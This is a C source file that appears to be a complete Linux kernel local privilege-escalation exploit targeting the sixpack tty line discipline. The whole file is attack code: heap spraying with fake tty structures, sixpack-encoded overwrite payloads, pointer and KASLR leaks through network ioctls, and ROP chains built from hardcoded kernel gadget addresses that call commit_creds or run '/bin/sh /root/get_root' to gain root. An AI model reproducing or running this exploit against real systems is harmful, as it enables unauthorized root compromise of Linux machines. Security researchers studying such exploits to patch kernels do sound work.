#include <endian.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <math.h>
#include <future>
#include <regex.h>
#include <linux/capability.h>

#include "heap_fs.h"
#include "sandbox.h"

#define TIOCSETD	0x5423
#define SIOCGIFNAME	0x8910
#define	SIOCSIFHWADDR	0x8924
#define MAX_NUM_OF_SIXPACK 500
#define FAKE_TTY_HEAD 0xdeadbeef
#define N_OBJ 24

#define phase0 16
#define phase1 24
#define phase2 48
#define phase3 64
#define phase4 96
#define phase5 112
#define phase6 128

#define PICKED_SP 0xb
#define MAGIC_PICK 0xb

#define OFFSET_OPS_IN_TTY 0x18
#define OFFSET_WRITE_IN_OPS 0x38
#define OFFSET_DEV_ADDR_IN_DEV 0x338
#define OFFSET_TTY_IN_DEV 0x8c0
#ifdef KDEBUG
#pragma message("Debug")
#define OFFSET_TIMER_FUNCTION_IN_NET_DEVICE 0x648
#define ADDR_PM_SUSPEND_TIMER_FN 0xffffffff816dcad0
#define ADDR_PSUH_RDI_POP_RSP_RET 0xffffffff81275bce
#define ADDR_POP_RDI_RET 0xffffffff81087b90
#define ADDR_PREPARE_KERNEL_CRED 0xffffffff810c51a0
#define ADDR_COMMIT_CREDS 0xffffffff810c4e20
#define ADDR_MOV_R12_RAX_COMMIT_CREDS 0xffffffff810c78aa
#define ADDR_DO_TASK_DEAD 0xffffffff810d3290
#define ADDR_RUN_CMD 0xffffffff810c5740
#define ADDR_SWAPGS_RET 0xffffffff81073080
#define ADDR_IRETQ 0xffffffff810cb141
#define ADDR_MOV_RDI_RAX_CALL_RDX 0xffffffff828cbb6f
#define ADDR_POP_RDX_RET 0xffffffff8169d322
#define ADDR_POP_POP_RET 0xffffffff813d4020
#else
#pragma message("Raw")
#define OFFSET_TIMER_FUNCTION_IN_NET_DEVICE 0x658
#define ADDR_PM_SUSPEND_TIMER_FN 0xffffffff816de830
#define ADDR_PSUH_RDI_POP_RSP_RET 0xffffffff812767ae
#define ADDR_POP_RDI_RET 0xffffffff8198b1ed
#define ADDR_POP_RAX_RET 0xffffffff810bedd6
#define ADDR_PREPARE_KERNEL_CRED 0xffffffff810c5200
#define ADDR_COMMIT_CREDS 0xffffffff810c4e80
#define ADDR_MOV_R12_RAX_COMMIT_CREDS 0xffffffff810c790a
#define ADDR_DO_TASK_DEAD 0xffffffff810d3360
#define ADDR_RUN_CMD 0xffffffff810c57a0
#define ADDR_SWAPGS_RET 0xffffffff810730a0
#define ADDR_IRETQ 0xffffffff81219049
#define ADDR_POP_RDX_RET 0xffffffff81543c16
#define ADDR_POP_POP_RET 0xffffffff81ab8c0d
#define ADDR_KPTI_TRAMPOLINE 0xffffffff81c00b3d
#endif
#define SIZE_TTY_STRUCT 0x400
#define SIZE_NET_DEVICE 0x1000

struct fake_tty_struct {
	unsigned long data[32];

	char cmd[0x38]; //ops = fake_tty+0x100
	void *write;
};

uint64_t r[N_OBJ][2] = {0xffffffffffffffff,};
int r_index = 0;

pthread_t thr[N_OBJ];

unsigned long kaslr_offset = 0xffffffffffffffff;
unsigned long tty_addr = 0;
unsigned long tty_ops_addr = 0;
unsigned long fake_tty_addr = 0;
unsigned long dev_addr = 0;
unsigned long write_obj = 0;
unsigned long read_obj;

HeapSpray *hs_1024 = NULL;
HeapSpray *hs = NULL;

static fake_tty_struct *rop = NULL;

int num_obj = 0;
int corrupted_tty[N_OBJ];

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_rflags;

pthread_mutex_t mutex1;
pthread_mutex_t mutex2;

void setup_sandbox() {
	int real_uid = getuid();
	int real_gid = getgid();

    if (unshare(CLONE_NEWUSER) != 0) {
		perror("[-] unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}

	if (!write_file("/proc/self/setgroups", "deny")) {
		perror("[-] write_file(/proc/self/set_groups)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)){
		perror("[-] write_file(/proc/self/uid_map)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
		perror("[-] write_file(/proc/self/gid_map)");
		exit(EXIT_FAILURE);
	}

	if (unshare(CLONE_NEWNS) != 0) {
		perror("unshare(CLONE_NEWNS)");
		exit(EXIT_FAILURE);
	}

	if (unshare(CLONE_NEWNET) != 0) {
		perror("[-] unshare(CLONE_NEWNET)");
		exit(EXIT_FAILURE);
	}

	//drop_net_caps();

	show_caps();
	printf("read uid: %d  fake uid: %d\n", real_uid, getuid());
}

static void save_state() {
	asm(
	"movq %%cs, %0\n"
	"movq %%ss, %1\n"
	"pushfq\n"
	"popq %2\n"
	: "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory" 		);
	printf("user_cs: %lx user_ss: %lx user_rflags: %lx\n", user_cs, user_ss, user_rflags);
}

void get_shell(void) {
	if(!getuid())
		system("/bin/sh");

	printf("It's not root\n");
	exit(0);
}

void spray_slab4096(int n)
{
	char *payload = (char *)malloc(700);
	memset(payload, 0, 700);

	HeapSpray *hs = new HeapSpray();
	hs->init_heap_spray(4096, (char *)payload, 700);
	hs->do_heap_spray(n);
}

HeapSpray *spray_slab1024(int n)
{
	struct fake_tty_struct *payload = (struct fake_tty_struct *)malloc(700);
	memset(payload, 0, 700);
	payload->data[0] = FAKE_TTY_HEAD;

	HeapSpray *hs = new HeapSpray();
	hs->init_heap_spray(1024, (char *)payload, 700);
	hs->do_heap_spray(n);
	return hs;
}

void *spray_rops(void *) {
	hs->do_heap_spray(10);
	pause();
	return 0;
}

static long syz_open_pts(volatile long a0, volatile long a1)
{
  int ptyno = 0;
  if (ioctl(a0, TIOCGPTN, &ptyno))
    return -1;
  char buf[128];
  sprintf(buf, "/dev/pts/%d", ptyno);
  return open(buf, a1, 0);
}

void alloc_required_objects(int num){
	if (num > MAX_NUM_OF_SIXPACK) {
		printf("More than 500 sixpack\n");
		exit(0);
	} else {
#ifdef DETAILS
		printf("[+] allocate tty structures\n");
#endif
	}
	num_obj = num;
	int *res = (int *)malloc(sizeof(int) * num);
#ifndef TESTNS
	hs_1024 = spray_slab1024(7);
	/*if (fork() == 0) {
		hs->do_heap_spray(10);
		sleep(3000);
	}
	usleep(100);*/
	hs_1024->do_spray(num*6, 0);
#endif
	for (int i=0; i<num; i++) {
#ifndef TESTNS
		hs_1024->do_free(i*6);
		hs_1024->do_free(i*6+1);
		hs_1024->do_free(i*6+2);
		usleep(10);
#endif
		res[i] =  syscall(__NR_openat, 0xffffffffffffff9cul, 0x20000040ul, 6ul, 0ul);
		if (res[i] != -1)
			r[i][0] = res[i];
	}

	for (int i=0; i<num; i++)
		syscall(__NR_ioctl, r[i][0], TIOCSPTLCK, 0x203b9fdcul);

	for (int i=0; i<num; i++) {
		res[i] = syz_open_pts(r[i][0], 0);
		if (res[i] != -1)
			r[i][1] = res[i];
	}
	return;
}

void calculate_encoded_data(unsigned long raw_data, int size, char *res, int index) {
    unsigned char b[12];
    if (size > 8) {
        printf("size of encode data should less or equal than 8 bytes\n");
        return;
    }

    memset(b, 0, 12);
    for (int i=0; i<size; i++) {
        b[i] = raw_data & 0xff;
        raw_data = raw_data >> 8;
        //printf("b[%d] = 0x%x raw_data: 0x%lx\n", i, b[i] & 0xff, raw_data);
    }

    for (int i=0; i<(int)ceil((double)size/3); i++) {
        res[index+i*4] = b[i*3] & 0x3f;
        res[index+i*4+1] = ((b[i*3] & 0xc0) >> 2) | (b[i*3+1] & 0x0f);
        res[index+i*4+2] = ((b[i*3+1] & 0xf0) >> 2) | (b[i*3+2] & 0x03);
        res[index+i*4+3] = b[i*3+2] >> 2;
    }
}

void clear_rx_count_cooked(int n) {
	char *payload = (char *)0x200100c0ul;
	payload[0] = 0x40;
	syscall(__NR_write, r[n][0], 0x200100c0ul, 0x1l);
	usleep(10*1000);
}

void *del_timer_once(void *n) {
	char *payload = (char *)0x200100c0ul;
	payload[0] = 0xe9;
	syscall(__NR_write, r[*(int *)n][0], 0x200100c0ul, 0x1l);
	usleep(10*1000);
}

void *register_sixpack(void *arg) {
	int data = 7;
	syscall(__NR_ioctl, r[*(int *)arg][1], TIOCSETD, &data);
}

unsigned long *read_by_SIOCGIFNAME(int n) {
	memset((void *)0x200f0000, 0, 24);
	syscall(__NR_ioctl, r[n][1], SIOCGIFNAME, 0x200f0000ul);
	return (unsigned long *)0x200f0000;
}

void write_by_SIOCSIFHWADDR(int n, unsigned long data) {
	*(unsigned long *)0x200f0000 = data;
	syscall(__NR_ioctl, r[n][1], SIOCSIFHWADDR, 0x200f0000ul);
	return;
}

void overwrite_timer() {
    memset((void *)0x200000c0ul, 0, 0xffa8ul);
	char *payload = (char *)0x200000c0ul;
	payload[0] = 181;
	payload[1] = 174;
	payload[2] = 255;

    // Change rx_count_cooked to 0x1e0
	calculate_encoded_data(0xe00000, 3, payload, 539);

    calculate_encoded_data(0xdeadbeef, 8, payload, 543); //pop rdi
    calculate_encoded_data(ADDR_PSUH_RDI_POP_RSP_RET+kaslr_offset, 8, payload, 575); // push rdi;pop rsp;ret
    
	syscall(__NR_write, r[phase1+1][0], 0x200000c0ul, 0x24ful);
}

int *read_dev() {
#ifdef DETAILS
	printf("[+] Reading device pointer\n");
#endif

	int *pick = (int *)malloc(sizeof(int)*2);
	memset((void *)0x200000c0ul, 0, 967);
	unsigned long *dev_ptrs = 0;
	char *payload = (char *)0x200000c0ul;
	payload[0] = 181;
	payload[1] = 174;
	payload[2] = 255;

	int t[N_OBJ];
	pthread_t th[N_OBJ];

	/*for (int k=0; k<N_OBJ; k++) {
		t[k] = k;
		pthread_create(&th[k], NULL, del_timer, (void *)&t[k]);
	}

	sleep(10);*/

	int flag = 0;
	for (int i=0; i<phase0; i++) {

		calculate_encoded_data(0x930000, 3, payload, 539);
		calculate_encoded_data(0xe9400, 3, payload, 543);
		calculate_encoded_data(0xdeadbeef, 8, payload, 955);
		calculate_encoded_data(0x50ffff, 3, payload, 963);
		syscall(__NR_write, r[i][0], 0x200000c0ul, 967);

		usleep(500*1000);

		corrupted_tty[0] = 1;
		int *cor_index = &corrupted_tty[0];
		for (int j=0; j<phase1; j++) {
			dev_ptrs = read_by_SIOCGIFNAME(j);
			for (int k=0; k<2; k++) {
				if (dev_ptrs[k] > 0xff00000000000000 && dev_ptrs[k] < 0xffffffff00000000 && (dev_ptrs[k] & 0xf50) == 0x50) {
					r_index = i+1;
					pick[0] = i;
					pick[1] = j;
					if (corrupted_tty[*cor_index] != i) {
						corrupted_tty[(*cor_index)++] = i;
					}
					if (dev_ptrs[2] < 0xff00000000000000)
						break;
					dev_addr = dev_ptrs[0] - 0x50;
					write_obj = dev_ptrs[2]-SIZE_NET_DEVICE-0x60;
					read_obj = dev_ptrs[2]-0x60;
					printf("[+] write at 0x%lx read at 0x%lx\n", write_obj, read_obj);
					clear_rx_count_cooked(i);
					return pick;
				}
			}
		}
	}

	return pick;
}

void overwrite_dev(int *pick) {
#ifdef DETAILS
	printf("[+] overwrite device pointer\n");
#endif
	memset((void *)0x200000c0ul, 0, 634);
	char *payload = (char *)0x200000c0ul;
	int forth_digit = (dev_addr >> 12) & 0xf;
	payload[0] = 181;
	payload[1] = 174;
	payload[2] = 255;

	int tty_found = 0;
	unsigned long tty_ptr = 0;


	calculate_encoded_data(0x930000, 3, payload, 539);
	calculate_encoded_data(0xf9400, 3, payload, 543);
	calculate_encoded_data(0xef0000, 3, payload, 611);
	calculate_encoded_data(0xdeadbe, 7, payload, 615);
	calculate_encoded_data(dev_addr >> 12 << 20 | 0x8c100, 8, payload, 623);
	calculate_encoded_data(dev_addr >> 40 & 0xffffff, 3, payload, 631);
	syscall(__NR_write, r[pick[0]][0], 0x200000c0ul, 635);

	usleep(500*1000);

	unsigned long *data = read_by_SIOCGIFNAME(pick[1]);

	//Zero out the left two bytes if they are not zero
	tty_ptr = data[0] << 8 >> 8;
	if (tty_ptr > 0xff000000000000 && tty_ptr < 0xffffffff000000 && (tty_ptr << 8) % SIZE_TTY_STRUCT == 0) {
#ifdef DETAILS
		printf("Leak tty pointer-> 0x%lx00\n", *(unsigned long *)0x200f0000ul);
#endif
		tty_addr = tty_ptr << 8;
	}

	if (tty_addr == 0) {
		printf("[-] Fail to get tty address\n");
		exit(0);
	}
	memset((void *)0x200000c0ul, 0, 634);
	unsigned long tty_7bytes_ptr = tty_addr >> 8;
	payload[0] = 181;
	payload[1] = 174;
	payload[2] = 255;
	calculate_encoded_data(0x930000, 3, payload, 539);
	calculate_encoded_data(0xf9400, 3, payload, 543);
	calculate_encoded_data(tty_7bytes_ptr, 7, payload, 615);
	calculate_encoded_data(dev_addr >> 12 << 20 | ((OFFSET_TIMER_FUNCTION_IN_NET_DEVICE << 8) + 0xff), 8, payload, 623);
	calculate_encoded_data(dev_addr >> 40 & 0xffffff, 3, payload, 631);

#ifdef DETAILS
	printf("-- Restore %d corrupted tty pointers\n", corrupted_tty[0]-1);
#endif

	for (int i=1; i<corrupted_tty[0]; i++) {
		clear_rx_count_cooked(corrupted_tty[i]);
		syscall(__NR_write, r[corrupted_tty[i]][0], 0x200000c0ul, 634);
	}

	sleep(1);
}

void bypass_kaslr(int *pick) {
	printf("[+} Leak KASLR offset\n");
	if (tty_addr == 0) {
		printf("tty address can not be zero\n");
		exit(1);
	}
	memset((void *)0x200000c0ul, 0, 0xffa8ul);
	unsigned long tty_7bytes_ptr = tty_addr >> 8;
	char *payload = (char *)0x200000c0ul;
	payload[0] = 181;
	payload[1] = 174;
	payload[2] = 255;

	unsigned long *ptr_func = read_by_SIOCGIFNAME(pick[1]);

	if (!(ptr_func[0]-ADDR_PM_SUSPEND_TIMER_FN & 0xffff)) {
		kaslr_offset = ptr_func[0]-ADDR_PM_SUSPEND_TIMER_FN;
#ifdef DETAILS
		printf("pm_suspend_timer_fn->0x%lx\n", *(unsigned long *)0x200f0000ul);
#endif
		printf("Leak KASLR offset: 0x%lx\n", kaslr_offset);
	}
}

void read_fake_tty(int *pick) {
#ifdef DETAILS
	printf("[+] Reading fake tty structure\n");
#endif
	if (tty_addr == 0) {
		printf("tty address can not be zero\n");
		exit(1);
	}
	unsigned long tty_7bytes_ptr = tty_addr >> 8;
	memset((void *)0x200000c0ul, 0, 634);
	char *payload = (char *)0x200000c0ul;
	payload[0] = 181;
	payload[1] = 174;
	payload[2] = 255;

	calculate_encoded_data(0x930000, 3, payload, 539);
	calculate_encoded_data(0xf9400, 3, payload, 543);
	calculate_encoded_data(tty_7bytes_ptr, 7, payload, 615);

	int count = 1;
	for (int i = 0; i < phase1; i++) {
		fake_tty_addr = tty_addr + SIZE_TTY_STRUCT*count;
		calculate_encoded_data((fake_tty_addr << 8) + 0xff, 8, payload, 623);
		calculate_encoded_data((fake_tty_addr >> 40), 3, payload, 631);
		clear_rx_count_cooked(pick[0]);
		syscall(__NR_write, r[pick[0]][0], 0x200000c0ul, 635);
#ifdef DETAILS
		printf("search fake tty structrues at 0x%lx\n", fake_tty_addr);
#else
		printf("search heap spraying objects\n");
#endif
		sleep(1);

		if (read_by_SIOCGIFNAME(pick[1])[0] == FAKE_TTY_HEAD) {
			tty_ops_addr = fake_tty_addr+0x100;
			r_index = i+4;
			return;
		}

		fake_tty_addr = tty_addr - SIZE_TTY_STRUCT*count;
		calculate_encoded_data((fake_tty_addr << 8) + 0xff, 8, payload, 623);
		calculate_encoded_data((fake_tty_addr >> 40) & 0xffffff, 3, payload, 631);
		clear_rx_count_cooked(pick[0]);
		syscall(__NR_write, r[pick[0]][0], 0x200000c0ul, 635);
#ifdef DETAILS
		printf("search fake tty structrues at 0x%lx\n", fake_tty_addr);
#endif		
		sleep(1);

		if (read_by_SIOCGIFNAME(pick[1])[0] == FAKE_TTY_HEAD) {
			tty_ops_addr = fake_tty_addr+0x100;
			r_index = i+4;
			return;
		}
		count++;
	}
}

void setup_rop_ret2user() {
	save_state();
	memset(rop, 0, 704);
	rop->data[0] = ADDR_POP_RDI_RET + kaslr_offset;
	rop->data[2] = ADDR_POP_RDI_RET + kaslr_offset;
	rop->data[3] = tty_ops_addr;
	rop->data[4] = ADDR_POP_RDI_RET + kaslr_offset;
	rop->data[6] = ADDR_PREPARE_KERNEL_CRED + kaslr_offset;
	rop->data[7] = ADDR_MOV_R12_RAX_COMMIT_CREDS + kaslr_offset;
	//rop->data[8] = ADDR_COMMIT_CREDS + kaslr_offset;
	//rop->data[9] = ADDR_MOV_RDI_RAX_CALL_RDX + kaslr_offset;
	//rop->data[10] = ADDR_POP_POP_RET + kaslr_offset;
	rop->data[11] = ADDR_POP_RDX_RET + kaslr_offset;
	rop->data[12] = fake_tty_addr + 0x100;
	rop->data[13] = ADDR_KPTI_TRAMPOLINE + kaslr_offset;
	rop->data[14] = 0x0;
	rop->data[15] = 0x0;
	rop->data[16] = (unsigned long)get_shell;
	rop->data[17] = user_cs;
	rop->data[18] = user_rflags;
	rop->data[19] = 0x20000000ul;
	rop->data[20] = user_ss;
	rop->write = (void *)(ADDR_PSUH_RDI_POP_RSP_RET + kaslr_offset);
}

void setup_rop_runcmd() {
	memset(rop, 0, 704);
	rop->data[0] = ADDR_POP_RDI_RET + kaslr_offset;
	rop->data[2] = ADDR_POP_RDI_RET + kaslr_offset;
	rop->data[3] = tty_ops_addr;
	rop->data[4] = ADDR_POP_RDI_RET + kaslr_offset;
	rop->data[5] = fake_tty_addr + 0x100;
	rop->data[6] = ADDR_RUN_CMD + kaslr_offset;
	rop->data[7] = ADDR_DO_TASK_DEAD + kaslr_offset;
	//rop->data[6] = ADDR_PREPARE_KERNEL_CRED + kaslr_offset;
	//rop->data[7] = ADDR_MOV_R12_RAX_COMMIT_CREDS + kaslr_offset;
	rop->data[11] = ADDR_POP_RDX_RET + kaslr_offset;
	rop->data[12] = fake_tty_addr + 0x100;
	rop->write = (void *)(ADDR_PSUH_RDI_POP_RSP_RET + kaslr_offset);

	char *cmd = "/bin/sh /root/get_root";
	memcpy(rop->cmd, cmd, strlen(cmd)+1);
}

void overtake_fake_tty() {
	setup_rop_runcmd();
	//setup_rop_ret2user();
	hs = new HeapSpray();
	hs->init_heap_spray(1024, (char *)rop, 704);
#ifdef KDEBUG
	syscall(__NR_ioctl, -1, 0x37778, 0x20fd0ffcul);
#endif
	pthread_t th;
	pthread_create(&th, NULL, spray_rops, NULL);

	/*if (fork() == 0) {
		hs->do_heap_spray(7);
		pause();
	}*/
#ifdef DETAILS
	printf("[+] overwriting fake tty structure\n");
#else
	printf("[+] tweaking heap objects\n");
#endif
	for (int i=0; i<num_obj; i++){
		hs_1024->do_free(i*6+3);
		hs_1024->do_free(i*6+4);
		hs_1024->do_free(i*6+5);
	}
	hs_1024->init_heap_spray(1024, (char *)rop, 704);
	hs_1024->do_heap_spray(5);
	sleep(2);
}

void overwrite_tty(int *pick) {
#ifdef DETAILS
	printf("[+] overwrite tty pointer\n");
#endif
	memset((void *)0x200000c0ul, 0, 628);
	char *payload = (char *)0x200000c0ul;
	payload[0] = 181;
	payload[1] = 174;
	payload[2] = 255;

	clear_rx_count_cooked(pick[0]);

	calculate_encoded_data(0x930000, 3, payload, 539);
	calculate_encoded_data(0xf9400, 3, payload, 543);
	calculate_encoded_data(fake_tty_addr >> 8, 7, payload, 615);
	//calculate_encoded_data(((fake_tty_addr + 16*8) << 8) + 0xff, 8, payload, 623);
	//calculate_encoded_data((fake_tty_addr >> 40) & 0xffffff, 3, payload, 631);

	syscall(__NR_write, r[pick[0]][0], 0x200000c0ul, 629);

	usleep(500*1000);
	//clear_rx_count_cooked(pick[0]);
}

void *restore_tty(void *t) {
	int n = *(int *)t;
	memset((void *)0x200000c0ul, 0, 629);
	char *payload = (char *)0x200000c0ul;
	payload[0] = 181;
	payload[1] = 174;
	payload[2] = 255;

	calculate_encoded_data(0x930000, 3, payload, 539);
	calculate_encoded_data(0xf9400, 3, payload, 543);
	calculate_encoded_data(tty_addr >> 8, 7, payload, 615);
	calculate_encoded_data((read_obj << 8) + 0xff, 8, payload, 623);
	calculate_encoded_data((read_obj >> 40) & 0xffffff, 3, payload, 631);
	syscall(__NR_write, r[n][0], 0x200000c0ul, 635);
}

void hijack_control_flow(int *pick) {
	printf("[+] Hijacking the control flow\n");
	char *payload = (char *)0x200000c0ul;
	payload[0] = 181;
	payload[1] = 174;
	payload[2] = 255;

	int t = pick[0];
	pthread_t th;
	pthread_create(&th, NULL, restore_tty, &t);
	del_timer_once(&pick[1]);
	printf("[+] Pwn!\n");
}

void loop() {
	int prot = PROT_READ | PROT_WRITE;
    int flags = MAP_SHARED | MAP_ANONYMOUS;
	syscall(__NR_mmap, 0x20000000ul, 0x1000000ul, 3ul, 0x32ul, -1, 0);
    rop = (fake_tty_struct *)syscall(__NR_mmap, NULL, 0x400, prot, flags, -1, 0);


	int n_cpu = 0;
	cpu_set_t my_set;
	CPU_ZERO(&my_set);
	CPU_SET(n_cpu, &my_set);   
	sched_setaffinity(0, sizeof(cpu_set_t), &my_set);
	
	setup_sandbox();
#ifdef TESTNS
	do_sandbox_none();
#endif
	memset(corrupted_tty, -1, N_OBJ);
	pthread_mutexattr_t attr[2];
    pthread_mutexattr_init(&attr[0]);
	pthread_mutexattr_init(&attr[1]);
    pthread_mutex_init(&mutex1, &attr[0]);
	pthread_mutex_lock(&mutex1);
	pthread_mutex_init(&mutex2, &attr[1]);
	pthread_mutex_lock(&mutex2);

	intptr_t res[500] = {0,};
	memcpy((void*)0x20000040, "/dev/ptmx\000", 10);

	*(uint32_t*)0x203b9fdc = 0;
	*(uint32_t*)0x203b9fe0 = 0;
	*(uint32_t*)0x203b9fe4 = 0;
	*(uint32_t*)0x203b9fe8 = 0;
	*(uint8_t*)0x203b9fec = 0;
	memcpy((void*)0x203b9fed, "\000\000\000\000\000\000\000\000\000\000\000\000"
				"\000\000\000\000\000\000\000",
		19);
	
	*(uint32_t*)0x20fd0ffc = 7;

	alloc_required_objects(N_OBJ);
#ifndef TESTNS
	spray_slab4096(5);
#endif

	show_caps();
	int t[N_OBJ];
	for (int i=0; i<num_obj; i++) {
		if (i == phase0 || i == phase1 || i == phase2) {
			sleep(1);
		}
		t[i] = i;
    	pthread_create(&thr[i], NULL, register_sixpack, (void *)&t[i]);
	}

	sleep(1);
	
	int *pick = read_dev();
	if (dev_addr == 0) {
		printf("[-] Fail to read dev address\n");
		sleep(3000);
	}
#ifdef DETAILS
	printf("[+] dev addr-> 0x%llx\n", dev_addr);
#endif

	overwrite_dev(pick);

	bypass_kaslr(pick);
	if (kaslr_offset == 0xffffffffffffffff) {
		printf("[-] Fail to get KASLR offset\n");
		sleep(3000);
	}

	read_fake_tty(pick);
	if (fake_tty_addr == 0) {
		printf("[-] Fail to read fake tty address\n");
		sleep(3000);
	}
#ifdef DETAILS
	printf("fake tty struct-> 0x%lx\n", fake_tty_addr);
#else
	printf("Found heap spraying object at 0x%lx\n", fake_tty_addr);
#endif

	overtake_fake_tty();

	overwrite_tty(pick);

	hijack_control_flow(pick);
	
	sleep(500);
	exit(1);
}

int main(void)
{
	loop();
}
